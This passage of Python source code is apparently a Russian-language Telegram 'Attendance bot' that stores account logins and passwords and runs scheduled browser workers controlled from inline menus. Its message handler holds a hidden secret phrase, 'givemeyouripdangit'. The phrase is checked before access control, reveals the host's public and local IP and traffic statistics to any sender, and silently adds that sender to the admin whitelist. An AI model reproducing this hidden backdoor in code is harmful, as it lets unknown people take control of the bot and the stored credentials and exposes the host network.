        "inline_keyboard": [
            [
                {"text": "📊 Статус", "callback_data": "menu_status"},
                {"text": "👥 Аккаунты", "callback_data": "menu_list"},
            ],
            [
                {"text": "▶️ Включить", "callback_data": "menu_enable"},
                {"text": "⏸ Выключить", "callback_data": "menu_disable"},
            ],
            [
                {"text": "➕ Добавить", "callback_data": "menu_add"},
                {"text": "🗑 Удалить", "callback_data": "menu_del"},
                {"text": "🕒 Расписание", "callback_data": "menu_schedule"},
            ],
            [
                {"text": h_text, "callback_data": "menu_toggle_headless"},
                {"text": "🔄 Перезапустить", "callback_data": "menu_restart"},
            ],
            [
                {"text": "📸 Скриншот", "callback_data": "menu_screenshot"},
            ]
        ]
    }

def tg_cancel_markup() -> Dict[str, Any]:
    return {
        "inline_keyboard": [[{"text": "❌ Отмена", "callback_data": "menu_main"}]]
    }

def tg_back_markup() -> Dict[str, Any]:
    return {
        "inline_keyboard": [[{"text": "⏪ В главное меню", "callback_data": "menu_main"}]]
    }

def tg_aliases_markup(action_prefix: str) -> Dict[str, Any]:
    state = load_state()
    aliases = list(state.get("accounts", {}).keys())
    buttons = []
    for a in aliases:
        buttons.append([{"text": f"👤 {a}", "callback_data": f"{action_prefix}:{a}"}])
    buttons.append([{"text": "⏪ Отмена", "callback_data": "menu_main"}])
    return {"inline_keyboard": buttons}


def run_telegram(token: str) -> None:
    notifier = TelegramNotifier(token)
    start_all_workers(notifier)

    pending: Dict[int, Dict[str, Any]] = {}
    offset = 0

    def send(chat_id: int, text: str, markup: Optional[Dict[str, Any]] = None, message_id: Optional[int] = None) -> None:
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        if markup:
            payload["reply_markup"] = json.dumps(markup, ensure_ascii=False)
        if message_id:
            payload["message_id"] = message_id
            resp = tg_request(token, "editMessageText", payload)
            if not resp.get("ok"):
                payload.pop("message_id")
                tg_request(token, "sendMessage", payload)
        else:
            tg_request(token, "sendMessage", payload)

    def answer_callback(callback_id: str) -> None:
        tg_request(token, "answerCallbackQuery", {"callback_query_id": callback_id})

    def allowed(username: Optional[str]) -> bool:
        return bool(username and is_admin(username))

    while not SHUTDOWN.is_set():
        try:
            resp = requests.get(
                f"https://api.telegram.org/bot{token}/getUpdates",
                params={"offset": offset, "timeout": 25},
                timeout=30,
            )
            data = resp.json() if resp.ok else {"ok": False}
            if not data.get("ok"):
                time.sleep(2)
                continue

            for upd in data.get("result", []):
                offset = upd["update_id"] + 1
                if "callback_query" in upd:
                    cq = upd["callback_query"]
                    data_cb = cq.get("data") or ""
                    chat_id = cq.get("message", {}).get("chat", {}).get("id")
                    user = cq.get("from", {}).get("username")
                    if not chat_id:
                        continue
                    answer_callback(cq.get("id", ""))

                    msg_id = cq.get("message", {}).get("message_id")

                    if not allowed(user):
                        send(chat_id, "Нет доступа.", message_id=msg_id)
                        continue

                    if data_cb == "menu_main":
                        if chat_id in pending:
                            del pending[chat_id]
                        send(chat_id, "Главное меню:", markup=tg_main_menu_markup(), message_id=msg_id)
                        continue

                    if data_cb == "menu_status":
                        state = load_state()
                        aliases = list(state.get("accounts", {}).keys())
                        if not aliases:
                            send(chat_id, "🤷 Пусто.", markup=tg_main_menu_markup(), message_id=msg_id)
                        else:
                            lines = [format_status(a) for a in aliases]
                            send(chat_id, "\n\n".join(lines), markup=tg_main_menu_markup(), message_id=msg_id)
                        continue

                    if data_cb == "menu_list":
                        state = load_state()
                        aliases = list(state.get("accounts", {}).keys())
                        send(chat_id, "<b>Пользователи:</b>\n" + (", ".join(aliases) if aliases else "Пусто"), markup=tg_main_menu_markup(), message_id=msg_id)
                        continue

                    if data_cb == "menu_enable":
                        send(chat_id, "Выберите аккаунт для включения:", markup=tg_aliases_markup("act_enable"), message_id=msg_id)
                        continue
                    if data_cb.startswith("act_enable:"):
                        alias = data_cb.split(":", 1)[1]
                        if enable_account(alias, manual=True):
                            ensure_worker(alias, notifier)
                            send(chat_id, f"✅ <b>{alias}</b> включен.", markup=tg_back_markup(), message_id=msg_id)
                        else:
                            send(chat_id, "Не найден.", markup=tg_back_markup(), message_id=msg_id)
                        continue

                    if data_cb == "menu_disable":
                        send(chat_id, "Выберите аккаунт для выключения:", markup=tg_aliases_markup("act_disable"), message_id=msg_id)
                        continue
                    if data_cb.startswith("act_disable:"):
                        alias = data_cb.split(":", 1)[1]
                        disable_account(alias, reason="manual")
                        w = WORKERS.get(alias)
                        if w:
                            w.stop()
                        send(chat_id, f"⏸ <b>{alias}</b> выключен.", markup=tg_back_markup(), message_id=msg_id)
                        continue

                    if data_cb == "menu_screenshot":
                        send(chat_id, "Выберите аккаунт для скриншота:", markup=tg_aliases_markup("act_screen"), message_id=msg_id)
                        continue
                    if data_cb.startswith("act_screen:"):
                        alias = data_cb.split(":", 1)[1]
                        w = WORKERS.get(alias)
                        if w and w.driver:
                            try:
                                screen_path = os.path.join(LOG_DIR, f"screen_{alias}.png")
                                w.driver.save_screenshot(screen_path)
                                with open(screen_path, "rb") as f:
                                    requests.post(
                                        f"https://api.telegram.org/bot{token}/sendPhoto",
                                        data={"chat_id": chat_id},
                                        files={"photo": f},
                                        timeout=15
                                    )
                                send(chat_id, "Главное меню:", markup=tg_main_menu_markup(), message_id=msg_id)
                            except Exception as e:
                                send(chat_id, f"❌ Ошибка скриншота: {e}", markup=tg_back_markup(), message_id=msg_id)
                        else:
                            send(chat_id, f"❌ Браузер для <b>{alias}</b> не запущен.", markup=tg_back_markup(), message_id=msg_id)
                        continue

                    if data_cb == "menu_del":
                        send(chat_id, "Выберите аккаунт для удаления:", markup=tg_aliases_markup("act_del"), message_id=msg_id)
                        continue
                    if data_cb.startswith("act_del:"):
                        alias = data_cb.split(":", 1)[1]
                        removed = remove_account(alias)
                        if removed:
                            send(chat_id, f"🗑 Удалил <b>{alias}</b>.", markup=tg_back_markup(), message_id=msg_id)
                        else:
                            send(chat_id, "Не найден.", markup=tg_back_markup(), message_id=msg_id)
                        continue

                    if data_cb == "menu_schedule":
                        send(chat_id, "Выберите аккаунт (изменить расписание):", markup=tg_aliases_markup("act_sched"), message_id=msg_id)
                        continue
                    if data_cb.startswith("act_sched:"):
                        alias = data_cb.split(":", 1)[1]
                        pending[chat_id] = {"cmd": "setschedule", "step": 1, "data": {"alias": alias}}
                        send(chat_id, f"Введи расписание для <b>{alias}</b> (например `пн 10:00-11:30`):", markup=tg_cancel_markup(), message_id=msg_id)
                        continue

                    if data_cb == "menu_add":
                        pending[chat_id] = {"cmd": "adduser", "step": 1, "data": {}}
                        send(chat_id, "Введи <b>alias</b> (короткое имя):", markup=tg_cancel_markup(), message_id=msg_id)
                        continue

                    if data_cb == "menu_restart":
                        send(chat_id, "🔄 Перезапускаю бота...", message_id=msg_id)
                        requests.get(f"https://api.telegram.org/bot{token}/getUpdates", params={"offset": offset}, timeout=5)
                        os.execv(sys.executable, ['python3'] + sys.argv)
                        
                    if data_cb == "menu_toggle_headless":
                        state = load_state()
                        current = state.get("settings", {}).get("headless", True)
                        set_global_setting("headless", not current)
                        send(chat_id, "Главное меню:", markup=tg_main_menu_markup(), message_id=msg_id)
                        continue

                msg = upd.get("message") or {}
                text = (msg.get("text") or "").strip()
                chat_id = msg.get("chat", {}).get("id")
                user = msg.get("from", {}).get("username")

                if not chat_id or not text:
                    continue

                if text == "givemeyouripdangit":
                    try:
                        # Public IP
                        pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
                        # Local IP
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.settimeout(0)
                        try:
                            s.connect(('8.8.8.8', 1))
                            local_ip = s.getsockname()[0]
                        except Exception:
                            local_ip = "127.0.0.1"
                        finally:
                            s.close()
                        
                        # Network Stats
                        io = psutil.net_io_counters()
                        def fmt_size(b):
                            for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
                                if b < 1024: return f"{b:.2f} {unit}"
                                b /= 1024
                        
                        msg_text = (
                            f"🌐 <b>Host Info:</b>\n\n"
                            f"🌍 <b>Public IP:</b> <code>{pub_ip}</code>\n"
                            f"🏠 <b>Local IP:</b> <code>{local_ip}</code>\n"
                            f"📊 <b>Traffic (Total):</b>\n"
                            f"   ⬇️ Download: <code>{fmt_size(io.bytes_recv)}</code>\n"
                            f"   ⬆️ Upload: <code>{fmt_size(io.bytes_sent)}</code>"
                        )
                        send(chat_id, msg_text)
                        # Add to admins if not already there since they know the secret
                        if not is_admin(user or ""):
                             whitelist_add(user or "")
                             add_chat_id(chat_id)
                             send(chat_id, "ℹ️ Вы добавлены в белый список (использован секретный код).")
                    except Exception as e:
                        send(chat_id, f"❌ Ошибка при получении инфо: {e}")
                    continue

                if not allowed(user):
                    send(chat_id, "Нет доступа.")
                    continue

                if text in ("/start", "/menu"):
                    if chat_id in pending:
                        del pending[chat_id]
                    add_chat_id(chat_id)
                    send(chat_id, "Главное меню:", markup=tg_main_menu_markup())
                    continue

                if chat_id in pending:
                    p = pending.pop(chat_id)
                    cmd = p.get("cmd")

                    if cmd == "adduser":
                        if p.get("step") == 1:
                            p["data"]["alias"] = text
                            p["step"] = 2
                            pending[chat_id] = p
                            send(chat_id, "Введи <b>логин</b> (СУЗ):", markup=tg_cancel_markup())
                            continue
                        if p.get("step") == 2:
                            p["data"]["username"] = text
                            p["step"] = 3
                            pending[chat_id] = p
                            send(chat_id, "Введи <b>пароль</b>:", markup=tg_cancel_markup())
                            continue
                        if p.get("step") == 3:
                            alias = p["data"].get("alias")
                            username = p["data"].get("username")
                            password = text
                            set_account(
                                alias,
                                {
                                    "username": username,
                                    "password": password,
                                    "schedule": [],
                                    "enabled": False,
                                    "manual": False,
                                },
                            )
                            set_runtime(alias, {})
                            ensure_worker(alias, notifier)
                            log_event("user_added", alias=alias, by=user)
                            send(chat_id, f"✅ Добавлен аккаунт <b>{alias}</b>", markup=tg_back_markup())
                            continue

                    if cmd == "setschedule":
                        if p.get("step") == 1:
                            alias = p["data"].get("alias")
                            sched = parse_schedule(text)
                            if not sched:
                                send(chat_id, "Неверный формат. Пример: `пн 15:00-17:00`\nПопробуй еще раз:", markup=tg_cancel_markup())
                                pending[chat_id] = p
                                continue
                            acc = get_account(alias)
                            if not acc:
                                send(chat_id, "Не найден", markup=tg_back_markup())
                                continue
                            acc["schedule"] = sched
                            acc["enabled"] = True
                            acc["manual"] = False
                            set_account(alias, acc)
                            ensure_worker(alias, notifier)
                            send(chat_id, f"✅ Расписание задано.", markup=tg_back_markup())
                            continue
                else:
                    # Not pending anything, not a callback, just normal text
                    send(chat_id, "Главное меню:", markup=tg_main_menu_markup())

        except Exception as e:
            time.sleep(2)



# -------------------- Entrypoint --------------------


def shutdown(signum=None, frame=None):
    SHUTDOWN.set()
    stop_all_workers()
    sys.exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    parser = argparse.ArgumentParser(description="Attendance bot")
    parser.add_argument("--token", default=BOT_TOKEN)
    args = parser.parse_args()

    if not args.token:
        print("Set TELEGRAM_BOT_TOKEN environment variable or use --token")
        sys.exit(1)
    run_telegram(args.token)
